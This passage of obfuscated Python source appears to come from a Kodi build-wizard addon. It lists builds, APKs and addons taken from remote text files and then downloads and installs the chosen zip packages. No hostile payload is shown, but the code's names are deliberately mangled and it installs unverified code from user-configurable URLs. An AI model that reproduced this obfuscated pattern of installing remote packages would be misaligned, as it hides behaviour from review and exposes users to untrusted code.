						for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2062
							if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2063
							if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2064
							OO0O0000OO00O00O0 =int (float (O00O0O00O0OO0O0OO ))#line:2065
							if OO0O0000OO00O00O0 <=15 :#line:2066
								OOO000OOO0O0O0OO0 =createMenu ('install','',O000OO00O0O0OO00O )#line:2067
								addDir ('[%s] %s (v%s)'%(float (O00O0O00O0OO0O0OO ),O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ),'viewbuild',O000OO00O0O0OO00O ,description =O0O0OO00O00O0OOOO ,fanart =OOOOO000O0O0O0000 ,icon =OO0O00O0O000O000O ,menu =OOO000OOO0O0O0OO0 ,themeit =THEME2 )#line:2068
		elif OO000O00O0OOO0OOO >0 :#line:2069
			if O0OO0OOO0OO00OO00 >0 :#line:2070
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2071
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2072
			else :#line:2073
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2074
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2075
	setView ('files','viewType')#line:2076
def viewBuild (OO0OOOOO000OOOO00 ):#line:2078
	O00OOOOOOOOOOO000 =wiz .workingURL (SPEEDFILE )#line:2079
	if not O00OOOOOOOOOOO000 ==True :#line:2080
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2081
		addFile ('%s'%O00OOOOOOOOOOO000 ,'',themeit =THEME3 )#line:2082
		return #line:2083
	if wiz .checkBuild (OO0OOOOO000OOOO00 ,'version')==False :#line:2084
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2085
		addFile ('%s was not found in the builds list.'%OO0OOOOO000OOOO00 ,'',themeit =THEME3 )#line:2086
		return #line:2087
	OOO0OO0OO00O0000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2088
	O00O0O0OO0O0O0000 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OOOOO000OOOO00 ).findall (OOO0OO0OO00O0000O )#line:2089
	for O0OO0O00O00OO0000 ,OOO00O0O0OO00O0OO ,OO000O000OO00OOO0 ,OOOOOO0000OOOOOOO ,O00O000OO0O0000OO ,OOOO00OO00OOOOO0O ,OOO0000OO0000000O ,O00O00000OOO0OO0O ,O000OOO00O0OO00OO ,OO0000OOOO00000O0 in O00O0O0OO0O0O0000 :#line:2090
		OOOO00OO00OOOOO0O =OOOO00OO00OOOOO0O if wiz .workingURL (OOOO00OO00OOOOO0O )else ICON #line:2091
		OOO0000OO0000000O =OOO0000OO0000000O if wiz .workingURL (OOO0000OO0000000O )else FANART #line:2092
		O00OOOOOOOO00O0O0 ='%s (v%s)'%(OO0OOOOO000OOOO00 ,O0OO0O00O00OO0000 )#line:2093
		if BUILDNAME ==OO0OOOOO000OOOO00 and O0OO0O00O00OO0000 >BUILDVERSION :#line:2094
			O00OOOOOOOO00O0O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00OOOOOOOO00O0O0 ,BUILDVERSION )#line:2095
		OO0O0000OO000O0O0 =int (float (KODIV ));OO00O000O00OOOO0O =int (float (OOOOOO0000OOOOOOO ))#line:2104
		if not OO0O0000OO000O0O0 ==OO00O000O00OOOO0O :#line:2105
			if OO0O0000OO000O0O0 ==16 and OO00O000O00OOOO0O <=15 :OOO00OOO00O0OOO0O =False #line:2106
			else :OOO00OOO00O0OOO0O =True #line:2107
		else :OOO00OOO00O0OOO0O =False #line:2108
		addFile ('התקנה','install',OO0OOOOO000OOOO00 ,'fresh',description =OO0000OOOO00000O0 ,fanart =OOO0000OO0000000O ,icon =OOOO00OO00OOOOO0O ,themeit =THEME1 )#line:2112
		if not O00O000OO0O0000OO =='http://':#line:2115
			if wiz .workingURL (O00O000OO0O0000OO )==True :#line:2116
				addFile (wiz .sep ('THEMES'),'',fanart =OOO0000OO0000000O ,icon =OOOO00OO00OOOOO0O ,themeit =THEME3 )#line:2117
				OOO0OO0OO00O0000O =wiz .openURL (O00O000OO0O0000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2118
				O00O0O0OO0O0O0000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0OO0OO00O0000O )#line:2119
				for OO0O0OO000O0O000O ,OO0000O0O00OO0O0O ,O0OO0O0O0OOOO0O0O ,O000O00O0OOOO000O ,O00000OOOOOOOO0O0 ,OO0000OOOO00000O0 in O00O0O0OO0O0O0000 :#line:2120
					if not SHOWADULT =='true'and O00000OOOOOOOO0O0 .lower ()=='yes':continue #line:2121
					O0OO0O0O0OOOO0O0O =O0OO0O0O0OOOO0O0O if O0OO0O0O0OOOO0O0O =='http://'else OOOO00OO00OOOOO0O #line:2122
					O000O00O0OOOO000O =O000O00O0OOOO000O if O000O00O0OOOO000O =='http://'else OOO0000OO0000000O #line:2123
					addFile (OO0O0OO000O0O000O if not OO0O0OO000O0O000O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0O0OO000O0O000O ,'theme',OO0OOOOO000OOOO00 ,OO0O0OO000O0O000O ,description =OO0000OOOO00000O0 ,fanart =O000O00O0OOOO000O ,icon =O0OO0O0O0OOOO0O0O ,themeit =THEME3 )#line:2124
	setView ('files','viewType')#line:2125
def viewThirdList (OOO0O00OO00OO000O ):#line:2127
	O0O00000O000O0O0O =eval ('THIRD%sNAME'%OOO0O00OO00OO000O )#line:2128
	O0OOO00O0O0OO0OOO =eval ('THIRD%sURL'%OOO0O00OO00OO000O )#line:2129
	OOOOO0OO0OOO00000 =wiz .workingURL (O0OOO00O0O0OO0OOO )#line:2130
	if not OOOOO0OO0OOO00000 ==True :#line:2131
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2132
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2133
	else :#line:2134
		OOO000O0OOOO0O0OO ,O0O0OO00000O0O0O0 =wiz .thirdParty (O0OOO00O0O0OO0OOO )#line:2135
		addFile ("[B]%s[/B]"%O0O00000O000O0O0O ,'',themeit =THEME3 )#line:2136
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2137
		if OOO000O0OOOO0O0OO :#line:2138
			for O0O00000O000O0O0O ,OO00OO0000OO000O0 ,O0OOO00O0O0OO0OOO ,OO0OO00OOO0O0OOOO ,O00O0O0OO000OO0OO ,O0O0O0OOOOO0O0OO0 ,OO000O0O00O0OO00O ,OO0OOO000O0OO00OO in O0O0OO00000O0O0O0 :#line:2139
				if not SHOWADULT =='true'and OO000O0O00O0OO00O .lower ()=='yes':continue #line:2140
				addFile ("[%s] %s v%s"%(OO0OO00OOO0O0OOOO ,O0O00000O000O0O0O ,OO00OO0000OO000O0 ),'installthird',O0O00000O000O0O0O ,O0OOO00O0O0OO0OOO ,icon =O00O0O0OO000OO0OO ,fanart =O0O0O0OOOOO0O0OO0 ,description =OO0OOO000O0OO00OO ,themeit =THEME2 )#line:2141
		else :#line:2142
			for O0O00000O000O0O0O ,O0OOO00O0O0OO0OOO ,O00O0O0OO000OO0OO ,O0O0O0OOOOO0O0OO0 ,OO0OOO000O0OO00OO in O0O0OO00000O0O0O0 :#line:2143
				addFile (O0O00000O000O0O0O ,'installthird',O0O00000O000O0O0O ,O0OOO00O0O0OO0OOO ,icon =O00O0O0OO000OO0OO ,fanart =O0O0O0OOOOO0O0OO0 ,description =OO0OOO000O0OO00OO ,themeit =THEME2 )#line:2144
def editThirdParty (OO0000OO0O0O0O0OO ):#line:2146
	O00OOOO0O000O0OO0 =eval ('THIRD%sNAME'%OO0000OO0O0O0O0OO )#line:2147
	OOO0O0OO00O00OOO0 =eval ('THIRD%sURL'%OO0000OO0O0O0O0OO )#line:2148
	O0OOO0O0O00OO0OO0 =wiz .getKeyboard (O00OOOO0O000O0OO0 ,'Enter the Name of the Wizard')#line:2149
	O0O0O000O00OO0O00 =wiz .getKeyboard (OOO0O0OO00O00OOO0 ,'Enter the URL of the Wizard Text')#line:2150
	wiz .setS ('wizard%sname'%OO0000OO0O0O0O0OO ,O0OOO0O0O00OO0OO0 )#line:2152
	wiz .setS ('wizard%surl'%OO0000OO0O0O0O0OO ,O0O0O000O00OO0O00 )#line:2153
def apkScraper (name =""):#line:2155
	if name =='kodi':#line:2156
		OOO00O0000O00OOOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2157
		O00O000O0O00O0OO0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2158
		O000OOOO00O0O00OO =wiz .openURL (OOO00O0000O00OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2159
		O0O0O000OO0000OOO =wiz .openURL (O00O000O0O00O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2160
		OO00O0O00OO00OOOO =0 #line:2161
		OO00O0OO0O000O000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OOOO00O0O00OO )#line:2162
		O0OOO0OO000OO0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0O000OO0000OOO )#line:2163
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2165
		OOO0000000000OO0O =False #line:2166
		for OOO0OO0OO0OOO0OO0 ,name ,O0OO0O000O000OOO0 ,O0OOO00O00OOO000O in OO00O0OO0O000O000 :#line:2167
			if OOO0OO0OO0OOO0OO0 in ['../','old/']:continue #line:2168
			if not OOO0OO0OO0OOO0OO0 .endswith ('.apk'):continue #line:2169
			if not OOO0OO0OO0OOO0OO0 .find ('_')==-1 and OOO0000000000OO0O ==True :continue #line:2170
			try :#line:2171
				O00OO0OOOO0O0O00O =name .split ('-')#line:2172
				if not OOO0OO0OO0OOO0OO0 .find ('_')==-1 :#line:2173
					OOO0000000000OO0O =True #line:2174
					O00O0OOOOOO000OO0 ,OOO00OOOOO0O0OO00 =O00OO0OOOO0O0O00O [2 ].split ('_')#line:2175
				else :#line:2176
					O00O0OOOOOO000OO0 =O00OO0OOOO0O0O00O [2 ]#line:2177
					OOO00OOOOO0O0OO00 =''#line:2178
				OO000OO0OO00OOO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0OOOO0O0O00O [0 ].title (),O00OO0OOOO0O0O00O [1 ],OOO00OOOOO0O0OO00 .upper (),O00O0OOOOOO000OO0 ,COLOR2 ,O0OO0O000O000OOO0 .replace (' ',''),COLOR1 ,O0OOO00O00OOO000O )#line:2179
				OOOO00O00OOOOOO0O =urljoin (OOO00O0000O00OOOO ,OOO0OO0OO0OOO0OO0 )#line:2180
				addFile (OO000OO0OO00OOO0O ,'apkinstall',"%s v%s%s %s"%(O00OO0OOOO0O0O00O [0 ].title (),O00OO0OOOO0O0O00O [1 ],OOO00OOOOO0O0OO00 .upper (),O00O0OOOOOO000OO0 ),OOOO00O00OOOOOO0O )#line:2181
				OO00O0O00OO00OOOO +=1 #line:2182
			except :#line:2183
				wiz .log ("Error on: %s"%name )#line:2184
		for OOO0OO0OO0OOO0OO0 ,name ,O0OO0O000O000OOO0 ,O0OOO00O00OOO000O in O0OOO0OO000OO0O0O :#line:2186
			if OOO0OO0OO0OOO0OO0 in ['../','old/']:continue #line:2187
			if not OOO0OO0OO0OOO0OO0 .endswith ('.apk'):continue #line:2188
			if not OOO0OO0OO0OOO0OO0 .find ('_')==-1 :continue #line:2189
			try :#line:2190
				O00OO0OOOO0O0O00O =name .split ('-')#line:2191
				OO000OO0OO00OOO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0OOOO0O0O00O [0 ].title (),O00OO0OOOO0O0O00O [1 ],O00OO0OOOO0O0O00O [2 ],COLOR2 ,O0OO0O000O000OOO0 .replace (' ',''),COLOR1 ,O0OOO00O00OOO000O )#line:2192
				OOOO00O00OOOOOO0O =urljoin (O00O000O0O00O0OO0 ,OOO0OO0OO0OOO0OO0 )#line:2193
				addFile (OO000OO0OO00OOO0O ,'apkinstall',"%s v%s %s"%(O00OO0OOOO0O0O00O [0 ].title (),O00OO0OOOO0O0O00O [1 ],O00OO0OOOO0O0O00O [2 ]),OOOO00O00OOOOOO0O )#line:2194
				OO00O0O00OO00OOOO +=1 #line:2195
			except :#line:2196
				wiz .log ("Error on: %s"%name )#line:2197
		if OO00O0O00OO00OOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2198
	elif name =='spmc':#line:2199
		O0000O00O0OOOO00O ='https://github.com/koying/SPMC/releases'#line:2200
		O000OOOO00O0O00OO =wiz .openURL (O0000O00O0OOOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2201
		OO00O0O00OO00OOOO =0 #line:2202
		OO00O0OO0O000O000 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000OOOO00O0O00OO )#line:2203
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2205
		for name ,O0OO00OO000O000OO in OO00O0OO0O000O000 :#line:2207
			O0OO0OO0OOO0O0O0O =''#line:2208
			O0OOO0OO000OO0O0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OO00OO000O000OO )#line:2209
			for O0O000O0OOOOO00OO ,OOOO0OOOOOOO00O0O ,O0O00O0OOOO00OOOO in O0OOO0OO000OO0O0O :#line:2210
				if O0O00O0OOOO00OOOO .find ('armeabi')==-1 :continue #line:2211
				if O0O00O0OOOO00OOOO .find ('launcher')>-1 :continue #line:2212
				O0OO0OO0OOO0O0O0O =urljoin ('https://github.com',O0O000O0OOOOO00OO )#line:2213
				break #line:2214
		if OO00O0O00OO00OOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2216
def apkMenu (url =None ):#line:2218
	if url ==None :#line:2219
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2222
	if not APKFILE =='http://':#line:2223
		if url ==None :#line:2224
			OO0O0O0O00000O000 =wiz .workingURL (APKFILE )#line:2225
			OOO00O0000OOO00OO =uservar .APKFILE #line:2226
		else :#line:2227
			OO0O0O0O00000O000 =wiz .workingURL (url )#line:2228
			OOO00O0000OOO00OO =url #line:2229
		if OO0O0O0O00000O000 ==True :#line:2230
			OO0O0OO0O0O0OOO00 =wiz .openURL (OOO00O0000OOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2231
			OO0000OO00O0O0OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0OO0O0O0OOO00 )#line:2232
			if len (OO0000OO00O0O0OO0 )>0 :#line:2233
				OO0OOO00O0OOO0000 =0 #line:2234
				for OO000O000000OO000 ,O0O000OO0O000O0OO ,url ,OOO00O0OO000000O0 ,O00O0000OO0O0O00O ,O0OOO00OOO00OO000 ,O00OOO0OO0OOO0000 in OO0000OO00O0O0OO0 :#line:2235
					if not SHOWADULT =='true'and O0OOO00OOO00OO000 .lower ()=='yes':continue #line:2236
					if O0O000OO0O000O0OO .lower ()=='yes':#line:2237
						OO0OOO00O0OOO0000 +=1 #line:2238
						addDir ("[B]%s[/B]"%OO000O000000OO000 ,'apk',url ,description =O00OOO0OO0OOO0000 ,icon =OOO00O0OO000000O0 ,fanart =O00O0000OO0O0O00O ,themeit =THEME3 )#line:2239
					else :#line:2240
						OO0OOO00O0OOO0000 +=1 #line:2241
						addFile (OO000O000000OO000 ,'apkinstall',OO000O000000OO000 ,url ,description =O00OOO0OO0OOO0000 ,icon =OOO00O0OO000000O0 ,fanart =O00O0000OO0O0O00O ,themeit =THEME2 )#line:2242
					if OO0OOO00O0OOO0000 <1 :#line:2243
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2244
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2245
		else :#line:2246
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2247
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2248
			addFile ('%s'%OO0O0O0O00000O000 ,'',themeit =THEME3 )#line:2249
		return #line:2250
	else :wiz .log ("[APK Menu] No APK list added.")#line:2251
	setView ('files','viewType')#line:2252
def addonMenu (url =None ):#line:2254
	if not ADDONFILE =='http://':#line:2255
		if url ==None :#line:2256
			O0O00OO00O0O00OO0 =wiz .workingURL (ADDONFILE )#line:2257
			OO00O0O00OO0OOO00 =uservar .ADDONFILE #line:2258
		else :#line:2259
			O0O00OO00O0O00OO0 =wiz .workingURL (url )#line:2260
			OO00O0O00OO0OOO00 =url #line:2261
		if O0O00OO00O0O00OO0 ==True :#line:2262
			O0O0O0OO00000O0O0 =wiz .openURL (OO00O0O00OO0OOO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2263
			O0OOO0O0OO00O0O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO00000O0O0 )#line:2264
			if len (O0OOO0O0OO00O0O0O )>0 :#line:2265
				OO0O00OO0OOOOOO00 =0 #line:2266
				for O00000OO00O00O0O0 ,O000O000OO0O0O0O0 ,url ,OOOOO00OO000O0O0O ,OO0OOOOOO0O00000O ,OOO0O0O000O0OO0O0 ,OO0O000OOO00OO0O0 ,OO00OOO000OOOO00O ,OO0000O0O0OOOO0O0 ,O0OOOO0000OOOOOOO in O0OOO0O0OO00O0O0O :#line:2267
					if O000O000OO0O0O0O0 .lower ()=='section':#line:2268
						OO0O00OO0OOOOOO00 +=1 #line:2269
						addDir ("[B]%s[/B]"%O00000OO00O00O0O0 ,'addons',url ,description =O0OOOO0000OOOOOOO ,icon =OO0O000OOO00OO0O0 ,fanart =OO00OOO000OOOO00O ,themeit =THEME3 )#line:2270
					else :#line:2271
						if not SHOWADULT =='true'and OO0000O0O0OOOO0O0 .lower ()=='yes':continue #line:2272
						try :#line:2273
							OO00O00OO00OOOOOO =xbmcaddon .Addon (id =O000O000OO0O0O0O0 ).getAddonInfo ('path')#line:2274
							if os .path .exists (OO00O00OO00OOOOOO ):#line:2275
								O00000OO00O00O0O0 ="[COLOR green][Installed][/COLOR] %s"%O00000OO00O00O0O0 #line:2276
						except :#line:2277
							pass #line:2278
						OO0O00OO0OOOOOO00 +=1 #line:2279
						addFile (O00000OO00O00O0O0 ,'addoninstall',O000O000OO0O0O0O0 ,OO00O0O00OO0OOO00 ,description =O0OOOO0000OOOOOOO ,icon =OO0O000OOO00OO0O0 ,fanart =OO00OOO000OOOO00O ,themeit =THEME2 )#line:2280
					if OO0O00OO0OOOOOO00 <1 :#line:2281
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2282
			else :#line:2283
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2284
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2285
		else :#line:2286
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2287
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2288
			addFile ('%s'%O0O00OO00O0O00OO0 ,'',themeit =THEME3 )#line:2289
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2290
	setView ('files','viewType')#line:2291
def addonInstaller (OOOO0O000O0000OO0 ,OOO0O0O00O0000O00 ):#line:2293
	if not ADDONFILE =='http://':#line:2294
		O00OOO0O0OOOO00OO =wiz .workingURL (OOO0O0O00O0000O00 )#line:2295
		if O00OOO0O0OOOO00OO ==True :#line:2296
			OOOOOOOO000O000O0 =wiz .openURL (OOO0O0O00O0000O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2297
			O0OOO0O0O00OO00OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO0O000O0000OO0 ).findall (OOOOOOOO000O000O0 )#line:2298
			if len (O0OOO0O0O00OO00OO )>0 :#line:2299
				for OOOOO0O00000OO0OO ,OOO0O0O00O0000O00 ,O0OOOO00OOO00OO00 ,OOO0OOO0OO00O0O00 ,O0O00O0000OO000O0 ,OO0000OO0O000O0O0 ,O00000OO00O0O00O0 ,OOOOOO00O00OOO0OO ,OOOO0O0O0000O0O0O in O0OOO0O0O00OO00OO :#line:2300
					if os .path .exists (os .path .join (ADDONS ,OOOO0O000O0000OO0 )):#line:2301
						O00OO000OO0O0O0OO =['Launch Addon','Remove Addon']#line:2302
						O0OOOO0O0O000OO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00OO000OO0O0O0OO )#line:2303
						if O0OOOO0O0O000OO00 ==0 :#line:2304
							wiz .ebi ('RunAddon(%s)'%OOOO0O000O0000OO0 )#line:2305
							xbmc .sleep (1000 )#line:2306
							return True #line:2307
						elif O0OOOO0O0O000OO00 ==1 :#line:2308
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO0O000O0000OO0 ))#line:2309
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO0O000O0000OO0 ))#line:2310
							except :pass #line:2311
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0O000O0000OO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2312
								removeAddonData (OOOO0O000O0000OO0 )#line:2313
							wiz .refresh ()#line:2314
							return True #line:2315
						else :#line:2316
							return False #line:2317
					O000O0O0O0OOO0OOO =os .path .join (ADDONS ,O0OOOO00OOO00OO00 )#line:2318
					if not O0OOOO00OOO00OO00 .lower ()=='none'and not os .path .exists (O000O0O0O0OOO0OOO ):#line:2319
						wiz .log ("Repository not installed, installing it")#line:2320
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO0O000O0000OO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOOO00OOO00OO00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2321
							O0O0OOOOOOOO00O00 =wiz .parseDOM (wiz .openURL (OOO0OOO0OO00O0O00 ),'addon',ret ='version',attrs ={'id':O0OOOO00OOO00OO00 })#line:2322
							if len (O0O0OOOOOOOO00O00 )>0 :#line:2323
								O0OO0O00OO00O0OO0 ='%s%s-%s.zip'%(O0O00O0000OO000O0 ,O0OOOO00OOO00OO00 ,O0O0OOOOOOOO00O00 [0 ])#line:2324
								wiz .log (O0OO0O00OO00O0OO0 )#line:2325
								if KODIV >=17 :wiz .addonDatabase (O0OOOO00OOO00OO00 ,1 )#line:2326
								installAddon (O0OOOO00OOO00OO00 ,O0OO0O00OO00O0OO0 )#line:2327
								wiz .ebi ('UpdateAddonRepos()')#line:2328
								wiz .log ("Installing Addon from Kodi")#line:2330
								OO0O0OO0OO00O0OO0 =installFromKodi (OOOO0O000O0000OO0 )#line:2331
								wiz .log ("Install from Kodi: %s"%OO0O0OO0OO00O0OO0 )#line:2332
								if OO0O0OO0OO00O0OO0 :#line:2333
									wiz .refresh ()#line:2334
									return True #line:2335
							else :#line:2336
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OOOO00OOO00OO00 )#line:2337
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO0O000O0000OO0 ,O0OOOO00OOO00OO00 ))#line:2338
					elif O0OOOO00OOO00OO00 .lower ()=='none':#line:2339
						wiz .log ("No repository, installing addon")#line:2340
						OO0000OOO0O0OOOO0 =OOOO0O000O0000OO0 #line:2341
						OOOO00O0OO0OO00OO =OOO0O0O00O0000O00 #line:2342
						installAddon (OOOO0O000O0000OO0 ,OOO0O0O00O0000O00 )#line:2343
						wiz .refresh ()#line:2344
						return True #line:2345
					else :#line:2346
						wiz .log ("Repository installed, installing addon")#line:2347
						OO0O0OO0OO00O0OO0 =installFromKodi (OOOO0O000O0000OO0 ,False )#line:2348
						if OO0O0OO0OO00O0OO0 :#line:2349
							wiz .refresh ()#line:2350
							return True #line:2351
					if os .path .exists (os .path .join (ADDONS ,OOOO0O000O0000OO0 )):return True #line:2352
					OOOOO0O0O00O0O0OO =wiz .parseDOM (wiz .openURL (OOO0OOO0OO00O0O00 ),'addon',ret ='version',attrs ={'id':OOOO0O000O0000OO0 })#line:2353
					if len (OOOOO0O0O00O0O0OO )>0 :#line:2354
						OOO0O0O00O0000O00 ="%s%s-%s.zip"%(OOO0O0O00O0000O00 ,OOOO0O000O0000OO0 ,OOOOO0O0O00O0O0OO [0 ])#line:2355
						wiz .log (str (OOO0O0O00O0000O00 ))#line:2356
						if KODIV >=17 :wiz .addonDatabase (OOOO0O000O0000OO0 ,1 )#line:2357
						installAddon (OOOO0O000O0000OO0 ,OOO0O0O00O0000O00 )#line:2358
						wiz .refresh ()#line:2359
					else :#line:2360
						wiz .log ("no match");return False #line:2361
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2362
		else :wiz .log ("[Addon Installer] Text File: %s"%O00OOO0O0OOOO00OO )#line:2363
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2364
def installFromKodi (O0OOO0OO0OOO0OO00 ,over =True ):#line:2366
	if over ==True :#line:2367
		xbmc .sleep (2000 )#line:2368
	wiz .ebi ('RunPlugin(plugin://%s)'%O0OOO0OO0OOO0OO00 )#line:2370
	if not wiz .whileWindow ('yesnodialog'):#line:2371
		return False #line:2372
	xbmc .sleep (1000 )#line:2373
	if wiz .whileWindow ('okdialog'):#line:2374
		return False #line:2375
	wiz .whileWindow ('progressdialog')#line:2376
	if os .path .exists (os .path .join (ADDONS ,O0OOO0OO0OOO0OO00 )):return True #line:2377
	else :return False #line:2378
def installAddon (OO00OO00O00OO00O0 ,O000O0OOO0O0OOOOO ):#line:2380
	if not wiz .workingURL (O000O0OOO0O0OOOOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO00OO00O00OO00O0 ,COLOR2 ));return #line:2381
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2382
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OO00O00OO00O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2383
	O00OOO0O00OO0O00O =O000O0OOO0O0OOOOO .split ('/')#line:2384
	OOOO0O0O0OO000O00 =os .path .join (PACKAGES ,O00OOO0O00OO0O00O [-1 ])#line:2385
	try :os .remove (OOOO0O0O0OO000O00 )#line:2386
	except :pass #line:2387
	downloader .download (O000O0OOO0O0OOOOO ,OOOO0O0O0OO000O00 ,DP )#line:2388
	OOO00OO00OO000O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OO00O00OO00O0 )#line:2389
	DP .update (0 ,OOO00OO00OO000O0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2390
	OOO0000O0O00O0O0O ,OO00OOO0000O0O000 ,O0O0O00O0000OOO0O =extract .all (OOOO0O0O0OO000O00 ,ADDONS ,DP ,title =OOO00OO00OO000O0O )#line:2391
	DP .update (0 ,OOO00OO00OO000O0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2392
	installed (OO00OO00O00OO00O0 )#line:2393
	installDep (OO00OO00O00OO00O0 ,DP )#line:2394
	DP .close ()#line:2395
